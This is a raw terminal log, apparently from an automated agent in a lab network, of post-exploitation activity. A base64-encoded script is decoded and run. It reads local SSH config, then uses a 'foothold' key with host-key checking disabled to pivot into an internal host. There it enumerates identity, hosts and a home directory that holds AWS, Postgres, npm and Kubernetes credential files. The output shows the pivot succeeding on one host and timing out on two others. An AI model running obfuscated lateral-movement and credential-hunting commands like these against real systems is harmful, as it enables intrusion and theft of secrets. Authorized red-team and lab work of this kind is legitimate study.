@@ -1,0 +1,100 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k08ws.sh <<'B64EOF'
+> ZWNobyAiPT09IGJveCBob3N0cy9zc2ggPT09IgpjYXQgL2V0Yy9ob3N0cwpscyAtbGEgfi8uc3NoIDI+L2Rldi9udWxsCmNhdCB+Ly5zc2gvY29uZmlnIDI+L2Rldi9udWxsCmdldGVudCBob3N0cyByb3dhbi1kZXYKZWNobyAiPT09IHRyeSBzc2ggPT09Igpmb3IgSCBpbiByb3dhbi1kZXYgMTAuNzcuNTAuMjAgMTAuNzcuNTUuMjsgZG8KICBlY2hvICItLS0gJEggLS0tIgogIHRpbWVvdXQgMjAgc3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IC1vIEJhdGNoTW9kZT15ZXMgLWkgfi8uc3NoL2tlcGxlcm9wcy1mb290aG9sZCAtcCAyMjIyIHJvd2FuQCRIICdob3N0bmFtZTsgaWQ7IGNhdCAvZXRjL2hvc3RzOyBlY2hvIC0tLTsgbHMgLWxhIH4vLmNvbmZpZy9maWVsZGxpbmsgL2hvbWUvcm93YW4gMj4vZGV2L251bGw7IGVjaG8gLS0tOyBncmVwIC1yaWwgZW50aXRsZW1lbnQgfiAyPi9kZXYvbnVsbCB8IGhlYWQgLTMwJyAyPiYxIHwgaGVhZCAtNjAKZG9uZQo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k08ws.sh; bash /tmp/k08ws.sh; echo DONEMARK_1795207420231$((6*7))
+=== box hosts/ssh ===
+127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::	ip6-localnet
+ff00::	ip6-mcastprefix
+ff02::1	ip6-allnodes
+ff02::2	ip6-allrouters
+10.77.40.10	kali.training kali
+10.77.41.2	kali.training kali
+10.50.13.180 rowan-dev
+total 28
+drwx------  3 cinder cinder 4096 Nov 20 18:19 .
+drwx------ 24 cinder cinder 4096 Nov 20 19:03 ..
+drwx------  2 cinder cinder 4096 Nov 19 15:41 agent
+-rw-------  1 cinder cinder  169 Nov 19 02:54 config
+-rw-------  1 cinder cinder  432 Nov 19 02:54 keplerops-foothold
+-rw-------  1 cinder cinder 1466 Nov 20 20:11 known_hosts
+-rw-r--r--  1 cinder cinder  142 Nov 20 18:19 known_hosts.old
+Host rowan-dev
+    User rowan
+    Port 2222
+    IdentityFile ~/.ssh/keplerops-foothold
+    UserKnownHostsFile /tmp/.ssh_known_hosts
+    StrictHostKeyChecking accept-new
+10.50.13.180    rowan-dev
+=== try ssh ===
+--- rowan-dev ---
+k-dev
+uid=2000(rowan) gid=2000(rowan) groups=2000(rowan)
+127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::	ip6-localnet
+ff00::	ip6-mcastprefix
+ff02::1	ip6-allnodes
+ff02::2	ip6-allrouters
+10.77.50.11	workload.keplerops.test
+10.77.50.11	objects.keplerops.test
+10.77.60.20	connector.arwc.test
+10.77.50.11	tickets.keplerops.test
+10.77.50.11	assistant.keplerops.test
+10.77.51.20	source-tools.keplerops.test
+10.77.50.11	staff.keplerops.test
+10.77.50.11	data.keplerops.test
+10.77.50.11	ca.keplerops.test
+10.77.51.41	review.keplerops.test
+10.77.51.70	indexer.keplerops.test
+10.77.50.11	workloads.keplerops.test
+10.77.50.11	id.keplerops.test
+10.77.50.11	support.keplerops.test
+10.77.50.11	llm.keplerops.test
+10.77.50.11	cert.keplerops.test
+10.77.50.40	kerberos.keplerops.test
+10.77.51.40	ci.keplerops.test
+10.77.51.30	packages.keplerops.test
+10.77.50.11	identity.keplerops.test
+10.77.50.11	cloud-api.keplerops.test
+10.77.51.50	preview.keplerops.test
+10.77.50.11	workboard.keplerops.test
+10.77.51.20	source.keplerops.test
+10.77.50.20	k-dev.keplerops.test k-dev
+10.77.55.2	k-dev.keplerops.test k-dev
+---
+/home/rowan:
+total 37492
+drwx------ 14 rowan rowan       4096 Nov 20 20:07 .
+drwxr-xr-x  1 root  root        4096 Nov 19 03:07 ..
+drwx------  2 rowan rowan       4096 Nov 19 07:11 .aws
+-rw-------  1 rowan rowan        120 Nov 19 18:48 .bash_history
+-rw-r--r--  1 rowan rowan        220 Jun  6  2025 .bash_logout
+-rw-r--r--  1 rowan rowan       3526 Jun  6  2025 .bashrc
+drwx------  5 rowan rowan       4096 Nov 19 07:11 .config
+-rw-------  1 rowan rowan        225 Sep 18 11:00 .gitconfig
+drwx------  3 rowan rowan       4096 Nov 19 13:40 .kube
+drwxr-xr-x  3 rowan rowan       4096 Nov 19 07:11 .local
+drwxr-xr-x  4 rowan rowan       4096 Nov 20 17:15 .npm
+-rw-------  1 rowan rowan        224 Nov 19 07:11 .npmrc
+-rw-------  1 rowan rowan        159 Nov 19 07:11 .pg_service.conf
+-rw-------  1 rowan rowan         95 Nov 19 07:11 .pgpass
+-rw-r--r--  1 rowan rowan        807 Jun  6  2025 .profile
+drwx------  2 rowan rowan       4096 Nov 20 18:27 .ssh
+-rwxr-xr-x  1 rowan rowan        238 Nov 19 02:54 .xsession
+-rw-r--r--  1 rowan rowan        890 Sep 18 11:00 README.md
+-rw-------  1 rowan rowan 4398768128 Nov 20 20:07 core
+drwxr-xr-x  5 rowan rowan       4096 Nov 20 17:30 k05arch
+drwxr-xr-x  6 rowan rowan       4096 Nov 20 17:31 repos
+drwxr-xr-x  5 rowan rowan       4096 Nov 20 18:54 repos_k05
+drwx------  2 rowan rowan       4096 Nov 19 03:07 results
+--- 10.77.50.20 ---
+ssh: connect to host 10.77.50.20 port 2222: Connection timed out
+--- 10.77.55.2 ---
+ssh: connect to host 10.77.55.2 port 2222: Connection timed out
